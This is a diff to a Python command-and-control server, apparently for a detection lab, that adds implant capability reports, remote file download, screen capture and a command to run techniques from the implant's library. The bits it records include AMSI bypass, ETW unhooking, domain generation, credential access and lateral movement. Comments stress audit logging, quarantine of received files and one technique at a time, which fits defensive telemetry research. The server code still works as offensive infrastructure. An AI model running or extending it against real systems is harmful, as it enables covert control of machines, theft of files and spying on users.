@@ -22,10 +22,16 @@ DESIGN CONSTRAINTS (deliberate)
 
 PROTOCOL (line oriented, UTF-8)
     client -> server   HELLO|<arch>|<pid>|<hostname>
+                       CAPS|<mask>
                        PONG
                        RESULT|<cmd_id>|<base64 output>|<exit_code>
+                       CHUNK|<cmd_id>|<seq>|<len>|<base64 bytes>
+                       DONE|<cmd_id>|<total bytes>
     server -> client   PING
                        EXEC|<cmd_id>|<command line>
+                       CAP|<cmd_id>|<technique>|<arguments>
+                       DL|<cmd_id>|<path>
+                       SHOT|<cmd_id>
                        EXIT
 
 USAGE
@@ -35,6 +41,10 @@ USAGE
         list                     show sessions
         exec 1 whoami            run a command in session 1
         exec all ver             run a command in every session
+        cap 1 recon sysinfo     run one technique from the capability library
+        cap 1 list              list the techniques this build carries
+        dl 1 C:\\Windows\\win.ini ask a session to transfer a file
+        shot 1                  ask a session to capture the screen
         ping 1                   measure round trip latency
         kill 1                   terminate a session cleanly
         stats                    session / command counts
@@ -46,6 +56,7 @@ from __future__ import annotations
 import argparse
 import base64
 import binascii
+import hashlib
 import json
 import os
 import shlex
@@ -64,6 +75,47 @@ PHANTOM-X :: LAB C2 SERVER
 
 def utcnow() -> str:
     return datetime.now(timezone.utc).isoformat()
+
+
+# The capability bits, in the same order as the payload's PX_CAP_MASK.
+#
+# A mask on its own is unreadable months later. "0x4f" in a log file
+# tells a future reader nothing; "obfuscated+amsi+etw+encrypted+dga"
+# tells them exactly which arm produced the session.
+CAP_BITS = (
+    (0x01, "obfuscated"),
+    (0x02, "amsi_bypass"),
+    (0x04, "etw_unhooked"),
+    (0x08, "encrypted_channel"),
+    (0x10, "domain_generation"),
+    (0x20, "credential_access"),
+    (0x40, "lateral_movement"),
+)
+
+
+def capability_names(mask: int) -> list[str]:
+    return [name for bit, name in CAP_BITS if mask & bit]
+
+
+def capability_summary(mask: int) -> str:
+    names = capability_names(mask)
+    if not names:
+        return "baseline"
+    return ",".join(names)
+
+
+def b64_decode_strict(s: str) -> bytes:
+    """Decode base64 the way the Go server does.
+
+    The padding is fixed up rather than appended blindly: a decoder
+    that accepts any number of trailing '=' would accept a chunk the
+    Go server rejects, and the two implementations would then disagree
+    about which transfers are valid. The cross-validation would then
+    report a difference that is really a difference in the decoders.
+    """
+    s = s.strip()
+    pad = (-len(s)) % 4
+    return base64.b64decode(s + "=" * pad)
 
 
 class AuditLog:
@@ -109,6 +161,13 @@ class Session:
         self.results: dict[str, dict] = {}
         self.pending_lock = threading.Lock()
         self.send_lock = threading.Lock()
+        # The capability report the payload sends at startup. It tells
+        # the server which arm it is talking to, which is the
+        # precondition for comparing a baseline run against a variant
+        # run.
+        self.capabilities = 0
+        self.cap_summary = ""
+        self.transfers: dict[str, dict] = {}
 
     # -- io ------------------------------------------------------------------
     def send(self, text: str) -> bool:
@@ -139,11 +198,14 @@ class Session:
 
 class C2Server:
     def __init__(self, host: str, port: int, logpath: str, console: bool = True,
-                 duration: int = 0):
+                 duration: int = 0, quarantine: str = ""):
         self.host = host
         self.port = port
         self.console = console
         self.duration = duration
+        # Where received file transfers are written. Empty means they
+        # are only hashed and recorded, not kept.
+        self.quarantine = quarantine
         self.audit = AuditLog(logpath)
         self.sessions: dict[int, Session] = {}
         self.session_lock = threading.Lock()
@@ -153,6 +215,8 @@ class C2Server:
         self.running = True
         self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        if self.quarantine:
+            os.makedirs(self.quarantine, exist_ok=True)
 
     # -- lifecycle ------------------------------------------------------------
     def start(self):
@@ -310,6 +374,90 @@ class C2Server:
                 rec["done"].set()
             return
 
+        if kind == "CAPS":
+            # The capability report. The payload says which variant
+            # build it is, and the server records it. This is what makes
+            # a baseline session distinguishable from a variant session
+            # in the audit log, which is the precondition for comparing
+            # them.
+            mask = 0
+            if len(parts) > 1:
+                try:
+                    mask = int(parts[1], 16)
+                except ValueError:
+                    mask = 0
+            sess.capabilities = mask
+            sess.cap_summary = capability_summary(mask)
+            self.audit.write("capabilities", session=sess.id,
+                             mask=f"0x{mask:02x}",
+                             capabilities=sess.cap_summary)
+            print(f"[*] session {sess.id} capabilities: {sess.cap_summary}")
+            return
+
+        if kind == "CHUNK":
+            # A piece of a file transfer.
+            #
+            # The payload sends the file in base64 chunks and a DONE
+            # marker at the end. The chunks are reassembled here, and
+            # the file is written to the quarantine directory so that
+            # the operator can look at what actually left the machine.
+            #
+            # The hash the audit log records is the SERVER'S hash of
+            # what arrived, not one the payload computed. A hash the
+            # payload chose is a hash of something the payload wanted to
+            # claim.
+            if len(parts) < 5:
+                self.audit.write("transfer_error", session=sess.id,
+                                 reason="malformed CHUNK")
+                return
+            cmd_id = parts[1]
+            seq = parts[2]
+            try:
+                raw = b64_decode_strict(parts[4])
+            except (binascii.Error, ValueError):
+                self.audit.write("transfer_error", session=sess.id,
+                                 cmd_id=cmd_id,
+                                 reason="chunk is not valid base64")
+                return
+            t = sess.transfers.setdefault(cmd_id, {"data": b"", "chunks": 0,
+                                                   "last_seq": seq})
+            t["data"] += raw
+            t["chunks"] += 1
+            t["last_seq"] = seq
+            return
+
+        if kind == "DONE":
+            # The end of a file transfer.
+            if len(parts) < 3:
+                self.audit.write("transfer_error", session=sess.id,
+                                 reason="malformed DONE")
+                return
+            cmd_id = parts[1]
+            t = sess.transfers.pop(cmd_id, None)
+            if t is None:
+                self.audit.write("transfer_error", session=sess.id,
+                                 cmd_id=cmd_id, reason="DONE with no chunks")
+                return
+
+            data = t["data"]
+            digest = hashlib.sha256(data).hexdigest()
+            path = ""
+            if self.quarantine:
+                name = f"transfer_{cmd_id}_{digest[:16]}.bin"
+                path = os.path.join(self.quarantine, name)
+                try:
+                    with open(path, "wb") as fh:
+                        fh.write(data)
+                except OSError:
+                    path = ""
+
+            self.audit.write("file_transfer", session=sess.id, cmd_id=cmd_id,
+                             bytes=len(data), chunks=t["chunks"],
+                             sha256=digest, written=path)
+            print(f"[*] session {sess.id} transferred {len(data)} bytes "
+                  f"(sha256 {digest[:16]})")
+            return
+
         self.audit.write("unknown_line", session=sess.id, line=line[:200])
 
     # -- dispatch -------------------------------------------------------------
@@ -342,6 +490,71 @@ class C2Server:
         sess.send("PING")
         ev.wait(timeout)
         return sess.latency_ms
+
+    def capability(self, sess: Session, technique: str, args: str,
+                   timeout: float = 30.0):
+        """Run one technique from the payload's capability library.
+
+        The technique and its arguments are named explicitly. There is
+        no catalogue walk and no "run everything": the lab measures one
+        technique at a time, so that the telemetry delta is attributable
+        to that technique and to nothing else.
+
+        The request carries a command id and the payload echoes it back,
+        so the answer can be correlated with the request.
+        """
+        with self.session_lock:
+            self.cmd_counter += 1
+            cmd_id = str(self.cmd_counter)
+        sess.commands_issued += 1
+        self.stats["commands"] += 1
+
+        ev = threading.Event()
+        with sess.pending_lock:
+            sess.pending[cmd_id] = {"type": "cap", "t0": time.time(),
+                                    "done": ev, "technique": technique}
+        self.audit.write("capability", session=sess.id, cmd_id=cmd_id,
+                         technique=technique, args=args)
+        line = f"CAP|{cmd_id}|{technique}"
+        if args:
+            line += f"|{args}"
+        if not sess.send(line):
+            return None
+        ev.wait(timeout)
+        with sess.pending_lock:
+            rec = sess.pending.get(cmd_id)
+        return sess.results.get(cmd_id)
+
+    def download(self, sess: Session, path: str):
+        """Ask a session to transfer a file.
+
+        The path is named explicitly. There is no globbing and no
+        directory sweep: the capability exists to be MEASURED, and the
+        measurement is about the telemetry, not about the harvest.
+        """
+        with self.session_lock:
+            self.cmd_counter += 1
+            cmd_id = str(self.cmd_counter)
+        sess.commands_issued += 1
+        self.stats["commands"] += 1
+        with sess.pending_lock:
+            sess.pending[cmd_id] = {"type": "download", "t0": time.time()}
+        self.audit.write("download_requested", session=sess.id,
+                         cmd_id=cmd_id, path=path)
+        return sess.send(f"DL|{cmd_id}|{path}")
+
+    def screenshot(self, sess: Session):
+        """Ask a session to capture the screen."""
+        with self.session_lock:
+            self.cmd_counter += 1
+            cmd_id = str(self.cmd_counter)
+        sess.commands_issued += 1
+        self.stats["commands"] += 1
+        with sess.pending_lock:
+            sess.pending[cmd_id] = {"type": "screenshot", "t0": time.time()}
+        self.audit.write("screenshot_requested", session=sess.id,
+                         cmd_id=cmd_id)
+        return sess.send(f"SHOT|{cmd_id}")
 
     # -- console --------------------------------------------------------------
     def _console_loop(self):
@@ -408,6 +621,47 @@ class C2Server:
                 else:
                     print("       (no output)")
             return
+        if line.startswith("cap"):
+            parts = line.split(None, 2)
+            if len(parts) < 3:
+                print("  usage: cap <session|all> <technique> [args]")
+                return
+            target, technique = parts[1], parts[2]
+            args = ""
+            if " " in technique:
+                technique, args = technique.split(" ", 1)
+            for s in self._targets(target):
+                print(f"  -> session {s.id}: capability {technique} {args}")
+                res = self.capability(s, technique, args)
+                if res is None:
+                    print(f"  <- session {s.id}: TIMEOUT (no result within 30s)")
+                    continue
+                out = res.get("output", "")
+                rc = res.get("exit_code")
+                print(f"  <- session {s.id}: exit={rc} "
+                      f"({res.get('elapsed_ms')}ms)")
+                if out:
+                    for ol in out.rstrip().splitlines():
+                        print(f"       {ol}")
+                else:
+                    print("       (no output)")
+            return
+        if line.startswith("dl"):
+            parts = line.split(None, 2)
+            if len(parts) < 3:
+                print("  usage: dl <session|all> <path>")
+                return
+            target, path = parts[1], parts[2]
+            for s in self._targets(target):
+                print(f"  -> session {s.id}: download {path}")
+                self.download(s, path)
+            return
+        if line.startswith("shot"):
+            arg = line.split(None, 1)[1] if len(line.split()) > 1 else "all"
+            for s in self._targets(arg):
+                print(f"  -> session {s.id}: screen capture")
+                self.screenshot(s)
+            return
         if line.startswith("kill"):
             arg = line.split(None, 1)[1] if len(line.split()) > 1 else "all"
             for s in self._targets(arg):
@@ -433,6 +687,10 @@ HELP = """
   list                 show active sessions
   exec <id|all> <cmd>  run a command in one or all sessions
   ping <id|all>        measure round trip latency
+  cap <id|all> <tech> [args]
+                       run one capability from the library
+  dl <id|all> <path>   ask a session to transfer a file
+  shot <id|all>        ask a session to capture the screen
   kill <id|all>        send EXIT (controlled session termination)
   stats                counters and audit log path
   help                 this text
@@ -449,11 +707,14 @@ def main(argv=None) -> int:
                     help="run headless (for scripted / automated runs)")
     ap.add_argument("--duration", type=int, default=0,
                     help="stop automatically after N seconds (0 = run forever)")
+    ap.add_argument("--quarantine", default="",
+                    help="directory to write received file transfers into")
     args = ap.parse_args(argv)
 
     print(BANNER)
     srv = C2Server(args.host, args.port, args.log,
-                   console=not args.no_console, duration=args.duration)
+                   console=not args.no_console, duration=args.duration,
+                   quarantine=args.quarantine)
     try:
         srv.start()
     except OSError as exc:
